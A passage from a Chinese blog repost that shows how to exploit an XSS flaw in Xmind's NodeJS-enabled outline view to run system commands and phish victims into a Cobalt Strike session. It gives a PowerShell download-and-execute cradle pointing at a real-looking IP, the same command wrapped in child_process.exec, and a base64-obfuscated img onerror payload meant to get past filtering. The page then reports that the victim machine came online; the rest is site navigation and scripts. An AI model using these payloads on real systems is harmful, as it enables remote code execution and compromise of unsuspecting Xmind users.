+<p>切换到 “大纲” 中，按下一个功能键即可触发攻击：</p>
+<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="null">image-20210518200926653</p>
+<p>由于 Xmind 启用了 NodeJS 功能，所以我们可以利用 child_process 调用并执行系统命令。这和蚁剑的 XSS 导致 RCE<br>原理如出一辙：<a target="_blank" rel="noopener" href="https://www.heibai.org/post/1152.html">https://www.heibai.org/post/1152.html</a></p>
+<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="null">image-20210518201144075<img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="null">image-20210518201232008</p>
+<p>同时我们可以利用这一点进行钓鱼，让受害机上线 Metasploit 或 CS。</p>
+<p>首先使用 CS 生成钓鱼使用的 PowerShell 脚本：</p>
+<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="null">image-20210518203625529</p>
+<p>点击 Launch 后生成攻击命令：</p>
+<pre><code>powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http://47.101.57.72:8088/shell&#39;))&quot;
+</code></pre>
+<p>即：</p>
+<pre><code>require(&#39;child_process&#39;).exec(&#39;powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(\&#39;http://47.101.57.72:8088/shell\&#39;))&quot;&#39;);
+</code></pre>
+<p>为了更好地 Bypass，我们可以将 payload 进行 base64 转化一下，最终的 Payload 如下：</p>
+<pre><code>&lt;imgsrc=xonerror=&#39;eval(newBuffer(`cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ3Bvd2Vyc2hlbGwuZXhlIC1ub3AgLXcgaGlkZGVuIC1jICJJRVggKChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKFwnaHR0cDovLzQ3LjEwMS41Ny43Mjo4MDg4L3NoZWxsXCcpKSInKTs=`,`base64`).toString())&#39;&gt;
+</code></pre>
+<p>如下图所示，受害机成功上线：</p>
+<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="null">image-20210518204433906<br><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
+<p><a target="_blank" rel="noopener" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247496998&amp;idx=1&amp;sn=da047300e19463fc88fcd3e76fda4203&amp;chksm=ec1ca019db6b290f06c736843c2713464a65e6b6dbeac9699abf0b0a34d5ef442de4654d8308&amp;scene=21#wechat_redirect"><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></a></p>
+<p><strong>点赞，转发，在看</strong></p>
+<p><code>原文地址：https://mp.weixin.qq.com/s/oNBbWyDTGVX07gRvZF9WLA</code></p>
+</div><div class="related-posts-section"><h3 class="related-posts-title">📚 相关文章</h3><div class="related-posts-list"><a class="related-post-item" href="/article/78a4cd34.html"><div class="related-post-title">可能是最全的 文本溢出截断省略 方案合集</div><div class="related-post-meta"><time>2019-12-09</time><div class="related-post-categories"><span class="category-badge">前端</span><span class="category-badge">FrontEnd</span></div></div></a><a class="related-post-item" href="/article/2f775138.html"><div class="related-post-title">vue3 组件 has no default export</div><div class="related-post-meta"><time>2025-10-29</time><div class="related-post-categories"><span class="category-badge">前端</span><span class="category-badge">FrontEnd</span><span class="category-badge">Vue3</span></div></div></a><a class="related-post-item" href="/article/f4a33aac.html"><div class="related-post-title">一道前端this面试题</div><div class="related-post-meta"><time>2022-05-27</time><div class="related-post-categories"><span class="category-badge">前端</span><span class="category-badge">FrontEnd</span></div></div></a><a class="related-post-item" href="/article/64189b69.html"><div class="related-post-title">Hbuilder格式化插件js-beautify配置</div><div class="related-post-meta"><time>2021-12-31</time><div class="related-post-categories"><span class="category-badge">前端</span><span class="category-badge">FrontEnd</span></div></div></a><a class="related-post-item" href="/article/fbe74506.html"><div class="related-post-title">React useEffect的陷阱</div><div class="related-post-meta"><time>2019-12-16</time><div class="related-post-categories"><span class="category-badge">前端</span><span class="category-badge">FrontEnd</span></div></div></a></div></div><iframe src="/donate/?AliPayQR=/img/AliPayQR.png&amp;WeChatQR=/img/WeChatQR.png&amp;UnionPayQR=null&amp;GitHub=null&amp;BTCQR=null&amp;BTCKEY=null&amp;PayPal=https://paypal.me/BigOldTwo&amp;afd=https://ifdian.net/order/create?user_id=1f326f88329e11eeb16752540025c377" style="overflow-x:hidden; overflow-y:hidden; border:0xp none #fff; min-height:240px; width:100%;" frameborder="0" scrolling="no"></iframe><div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>搬砖大老</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="/article/2c1fef23.html">https://xuehuayu.cn/article/2c1fef23.html</a></li><li class="post-copyright-license"><strong>版权声明：</strong>① 标为原创的文章为博主原创，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接。② 部分文章内容由 AI 生成，内容仅供参考，请仔细甄别。③ 标为转载的文章来自网络，已标明出处，<a href="mailto:boss@xuehuayu.cn">侵删</a>。</li></ul></div><br><div class="tags"></div><div class="post-nav"><a class="pre" href="/article/dbb269ad.html">uni-app/vue手写签名</a><a class="next" href="/article/b791217d.html">阿里面试：说一下从 url 输入到返回请求的过程</a></div><div id="waline-comment"></div><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v3/dist/waline.min.css"><script src="//cdn.jsdelivr.net/npm/@waline/client@v3/dist/waline.min.js"></script><script type="module">const { init } = await import('//cdn.jsdelivr.net/npm/@waline/client@v3/dist/waline.js');
+const origin = window.location.origin
+const serverURL = origin.includes('cainiaoblog') ? 'https://guest.cainiaoblog.cn' : 'https://guest.xuehuayu.cn'
+const locale = {
+  placeholder: '请正确填写昵称和邮箱，方便接收回复通知~',
+  sofa: '沙发空缺中，还不快抢~',
+  admin: '管理员'
+};
+init({
+  el: '#waline-comment',
+  serverURL: serverURL,
+  locale,
+  pageSize: '20',
+  visitor: false == true, // 阅读量统计
+  requiredMeta: ['nick', 'mail'],
+  pageview: true,
+  reaction: true,
+  emoji: [
+    '//cdn.jsdelivr.net/npm/@waline/emojis@1.4.0/qq',
+    '//cdn.jsdelivr.net/npm/@waline/emojis@1.4.0/bmoji',
+    '//cdn.jsdelivr.net/npm/@waline/emojis@1.4.0/bilibili',
+    '//cdn.jsdelivr.net/npm/@waline/emojis@1.4.0/weibo',
+    '//cdn.jsdelivr.net/npm/@waline/emojis@1.4.0/tieba',
+    '//cdn.jsdelivr.net/npm/@waline/emojis@1.4.0/tw-emoji',
+    '//cdn.jsdelivr.net/npm/@waline/emojis@1.4.0/alus',
+    '//cdn.jsdelivr.net/npm/@waline/emojis@1.4.0/soul-emoji'
+  ],
+})</script></div></div></div><div class="pure-u-1 pure-u-md-1-4 fixed-search hidden_mid_and_down"><div id="sidebar"><script type="text/javascript" src="/js/search.js"></script><div class="widget widget-all-search"><div class="widget-search"><input class="search" type="radio" name="search" value="baidu" id="baidu" checked="checked"/><label class="label" for="baidu" title="百度全站搜索">百度</label><input class="search" type="radio" name="search" value="google" id="google"/><label class="label" for="google" title="谷歌全站搜索">谷歌</label><input class="search" type="radio" name="search" value="self" id="self"/><label class="label" for="self" title="使用站内搜索">站内</label></div><div class="widget" id="search"><form class="search-form" action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" target="_blank"><input type="search" name="word" maxlength="30" placeholder="百度全站搜索"/><input type="hidden" name="si" value="xuehuayu.cn"/><input type="hidden" name="cl" value="3"/><input type="hidden" name="ct" value="2097152"/><input type="hidden" name="s" value="on"/><input class="search-submit" type="submit" value=""/></form></div></div><script>$('input[type=radio][name=search]').change(function() {
+  var val = $(this).val()
+  var self = '<div class="search-form"><input id="local-search-input" placeholder="站内搜索，首次慢" type="search" name="q" results="0"><input class="search-submit" type="submit" value=""/><div id="local-search-result"></div></div>'
+  var google = '<form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="search" name="q" maxlength="30" placeholder="谷歌全站搜索"><input type="hidden" name="sitesearch" value="xuehuayu.cn"><input class="search-submit" type="submit" value=""/></form>'
+  var baidu = '<form class="search-form" action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" target="_blank"><input type="search" name="word" maxlength="30" placeholder="百度全站搜索"><input type="hidden" name="si" value="xuehuayu.cn"><input type="hidden" name="cl" value="3"><input type="hidden" name="ct" value="2097152"><input type="hidden" name="s" value="on"><input class="search-submit" type="submit" value=""/></form>'
+
+  if (val === 'self') {
+      $('#search').html(self)
+      var search_path = 'search.xml';
+      if (search_path.length == 0) {
+        search_path = '//search.xml';
+      }
+      var path = '/' + search_path;
+      searchFunc(path, 'local-search-input', 'local-search-result');
+  } else if (val === 'baidu') {
+      $('#search').html(baidu)
+  } else if (val === 'google') {
+      $('#search').html(google)
+  }
+})</script><div class="widget widget-wxmp"><img alt="微信公众号" width="100%" src="/img/mp-mini.png"/></div><div class="widget widget-recent-posts"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/article/90947add.html">又拍云注销账号退款结果</a></li><li class="post-list-item"><a class="post-list-link" href="/article/40a96678.html">又拍云注销账号退款：一场本不该如此“恶心”的用户告别</a></li><li class="post-list-item"><a class="post-list-link" href="/article/87ba5860.html">本站已全面接入腾讯edgeone</a></li><li class="post-list-item"><a class="post-list-link" href="/article/68c9c2c2.html">使用 Vercel + Upstash Redis 搭建自己的加速缓存服务</a></li><li class="post-list-item"><a class="post-list-link" href="/article/46124b4e.html">账号被封了？被担心，不是！是Cloudflare崩了！</a></li></ul></div><div class="widget widget-recent-comments"><div class="widget-title"><i class="fa fa-comment-o"> 最近评论</i></div><div class="waline-recent" id="waline-recent"></div></div><script type="module">const { RecentComments } = await import('//cdn.jsdelivr.net/npm/@waline/client@v3/dist/waline.js');
+const origin = window.location.origin
+const serverURL = origin.includes('cainiaoblog') ? 'https://guest.cainiaoblog.cn' : 'https://guest.xuehuayu.cn'
+
+RecentComments({
+  el: '#waline-recent',
+  serverURL,
+  count: 5,
+}).then(({ comments }) => {
+  const commentList = comments?.data.map(
+    (comment) => {
+      const cmts = ((comment||{}).comment || '').replace(/<\/?.*?>/g, '').replace(/\n/g, ' ')
+      const time = ((comment||{}).insertedAt || '').substring(0, 10)
+      const link = (comment||{}).link
+      const info = link ? `<a class="flex-block align-center" href="${link}"><img class="comment-avatar" width="30" src="${comment.avatar}" alt="${comment.nick}"/><span class="comment-nick">${comment.nick}</span></a>` : `<img class="comment-avatar" width="30" src="${comment.avatar}" alt="${comment.nick}"/><span class="comment-nick">${comment.nick}</span>`
+      const url = (comment||{}).url + '#' + (comment||{}).objectId
+      return `<li class="comment-list-item"><div class="comment-top flex-block justify-between align-center"><div class="comment-info flex-block align-center">${info}</div><span>${time}</span></div><div class="comment-content"><a class="post-list-link line-3" href="${url}">${cmts}</a></div></li>`
+    }
+  );
+  document.getElementById('waline-recent').innerHTML = `<url class="comment-list">${commentList.join('')}</ul>`
+});</script><div class="widget widget-categories"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/ADBlock/">ADBlock</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Blog/">Blog</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CDN/">CDN</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CDN/%E7%BD%91%E7%AB%99/">网站</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/FrontEnd/">FrontEnd</a><span class="category-list-count">277</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Games/">Games</a><span class="category-list-count">5</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Games/World-of-Warcraft/">World of Warcraft</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Git/">Git</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Histiry/">Histiry</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hls/">Hls</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/KKPlayer/">KKPlayer</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/LiveTV/">LiveTV</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/M3U8/">M3U8</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Movies/">Movies</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Player/">Player</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/React/">React</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/TV/">TV</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Vue3/">Vue3</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Webpack/">Webpack</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/World-of-Warcraft/">World of Warcraft</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/debugger/">debugger</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%AA%E7%A8%8E/">个税</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%84%BF%E7%AB%A5/">儿童</a><span class="category-list-count">8</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%84%BF%E7%AB%A5/%E5%81%A5%E5%BA%B7/">健康</a><span class="category-list-count">8</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%84%BF%E7%AB%A5/%E5%81%A5%E5%BA%B7/Children/">Children</a><span class="category-list-count">8</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%84%BF%E7%AB%A5/%E5%81%A5%E5%BA%B7/Children/Health/">Health</a><span class="category-list-count">8</span></li></ul></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%AC%E4%BC%97%E5%8F%B7/">公众号</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%89%8D%E7%AB%AF/">前端</a><span class="category-list-count">293</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%89%8D%E7%AB%AF/FrontEnd/">FrontEnd</a><span class="category-list-count">15</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%89%8D%E7%AB%AF/FrontEnd/Chrome/">Chrome</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%89%8D%E7%AB%AF/FrontEnd/Class/">Class</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%89%8D%E7%AB%AF/FrontEnd/Git/">Git</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%89%8D%E7%AB%AF/FrontEnd/Map/">Map</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%89%8D%E7%AB%AF/FrontEnd/TypeScript/">TypeScript</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%89%8D%E7%AB%AF/FrontEnd/Vue3/">Vue3</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%89%8D%E7%AB%AF/Frontend/">Frontend</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%89%8D%E7%AB%AF/Frontend/PDF/">PDF</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%89%8D%E7%AB%AF/Frontend/PDF/Image/">Image</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%89%8D%E7%AB%AF/Frontend/PDF/Image/%E8%AF%B7%E6%B1%82%E5%A4%B4/">请求头</a><span class="category-list-count">1</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%89%8D%E7%AB%AF/Frontend/Redis/">Redis</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%89%8D%E7%AB%AF/Frontend/Redis/Vercel/">Vercel</a><span class="category-list-count">1</span></li></ul></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%8D%9A%E5%AE%A2/">博客</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%8E%86%E5%8F%B2/">历史</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%8E%86%E5%8F%B2/Histiry/">Histiry</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%8F%88%E6%8B%8D%E4%BA%91/">又拍云</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7/">工具</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B9%BF%E5%91%8A%E8%BF%87%E6%BB%A4/">广告过滤</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BD%B1%E8%A7%86/">影视</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%92%AD%E6%94%BE%E5%99%A8/">播放器</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%96%B0%E5%8D%8E%E5%AD%97%E5%85%B8/">新华字典</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%96%B0%E5%8D%8E%E5%AD%97%E5%85%B8/%E5%8E%86%E5%8F%B2/">历史</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%96%B0%E5%8D%8E%E5%AD%97%E5%85%B8/%E5%8E%86%E5%8F%B2/%E6%96%87%E5%8C%96/">文化</a><span class="category-list-count">1</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%B8%E6%88%8F/">游戏</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%94%9F%E6%B4%BB/">生活</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%94%9F%E6%B4%BB/%E6%89%8B%E6%9C%BA/">手机</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%94%B5%E5%BD%B1/">电影</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%9B%B4%E6%92%AD/">直播</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A5%9E%E8%AF%9D/">神话</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%B3%BB%E7%BB%9F/">系统</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%B3%BB%E7%BB%9F/System/">System</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%B3%BB%E7%BB%9F/System/Windows/">Windows</a><span class="category-list-count">1</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%9B%98/">网盘</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%8A%82%E7%82%B9/">节点</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%A3%85%E4%BF%AE/">装修</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%AD%94%E5%85%BD%E4%B8%96%E7%95%8C/">魔兽世界</a><span class="category-list-count">2</span></li></ul></div><div class="widget widget-links"><div class="widget-title"><i class="fa fa-external-link"> 友链</i></div><ul><li><a href="https://ghfast.top/https://raw.githubusercontent.com/npljy/haoka/main/imgs/qrcode.jpg" title="运营商官方大流量手机卡" target="_blank">运营商官方大流量手机卡</a></li><li><a href="https://m3u8.xuehuayu.cn?utm_source=xuehuayu.cn&amp;utm_term=KKPlayer" title="M3U8加速播放器" target="_blank">M3U8加速播放器</a></li><li><a href="https://chrome.xuehuayu.cn?utm_source=xuehuayu.cn&amp;utm_term=KKPlayer" title="Chrome命令行参数生成器" target="_blank">Chrome命令行参数生成器</a></li><li><a href="https://laonongmin.online?utm_source=xuehuayu.cn&amp;utm_term=KKPlayer" title="KK Player" target="_blank">KK Player</a></li></ul></div><div class="widget widget-ip"><div class="widget-title"></div><img alt="info" width="100%" src="https://tool.lu/netcard/" onclick="window.open(&quot;https://laonongmin.online&quot;)"/></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer"><div class="flex-block justify-center align-center flex-wrap"><a class="gxba-link" id="gxba" rel="nofollow" target="_blank" href="http://beian.miit.gov.cn/">京ICP备20007647号-2</a><a class="gaba-link" id="gaba-link" rel="nofollow" target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=11010802031264"><img class="nofancybox" src="/img/gaba.png" alt=""/><span id="gaba">京公网安备 11010802031264号</span><span style="padding-right: 10px;"></span></a><span>Copyright © 2025 </span><a href="/." rel="nofollow">前端壹菜鸟. </a><script>(function(){
+  var cnb =window.location.origin.includes('cainiaoblog')
+  if (cnb) {
+    var gxba =document.getElementById('gxba')
+    var gaba =document.getElementById('gaba')
+    var gabaLink =document.getElementById('gaba-link')
+    gxba.innerText ='京ICP备20007647号-1'
+    gaba.innerText ='京公网安备 11010802031254号'
+    gabaLink.setAttribute('href','http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=11010802031254')
+  }
+})()</script></div><div><a class="flex-block justify-center align-center flex-wrap" rel="nofollow" title="51la网站统计" target="_blank" href="https://v6.51.la/s/Guz3lwHCsVme9Cu"><script id="LA-DATA-WIDGET" crossorigin="anonymous" charset="UTF-8" src="https://v6-widget.51.la/v6/JkUaixMjOhC8emNs/quote.js?theme=0&amp;f=12&amp;display=0,1,1,1,1,1,1,1"></script></a></div></div></div></div><a class="show" id="rocket" title="返回顶部" href="#top"></a><div class="darkmode-toggle" title="开灯/关灯">🌓</div><script type="text/javascript" src="/js/totop.js?v=9" async></script><script type="text/javascript" src="/js/dark.js?v=9" async></script><script type="text/javascript" src="/js/codeblock-resizer.js"></script><script type="text/javascript" src="/js/smartresize.js"></script></div></body><div class="footer-links"><i class="fa fa-external-link"> 友链</i><span>：</span><span class="link"><span class="gap gap-0">|</span><a href="https://ghfast.top/https://raw.githubusercontent.com/npljy/haoka/main/imgs/qrcode.jpg" title="运营商官方大流量手机卡" target="_blank">运营商官方大流量手机卡</a></span><span class="link"><span class="gap gap-1">|</span><a href="https://m3u8.xuehuayu.cn?utm_source=xuehuayu.cn&amp;utm_term=KKPlayer" title="M3U8加速播放器" target="_blank">M3U8加速播放器</a></span><span class="link"><span class="gap gap-2">|</span><a href="https://chrome.xuehuayu.cn?utm_source=xuehuayu.cn&amp;utm_term=KKPlayer" title="Chrome命令行参数生成器" target="_blank">Chrome命令行参数生成器</a></span><span class="link"><span class="gap gap-3">|</span><a href="https://laonongmin.online?utm_source=xuehuayu.cn&amp;utm_term=KKPlayer" title="KK Player" target="_blank">KK Player</a></span></div></html>
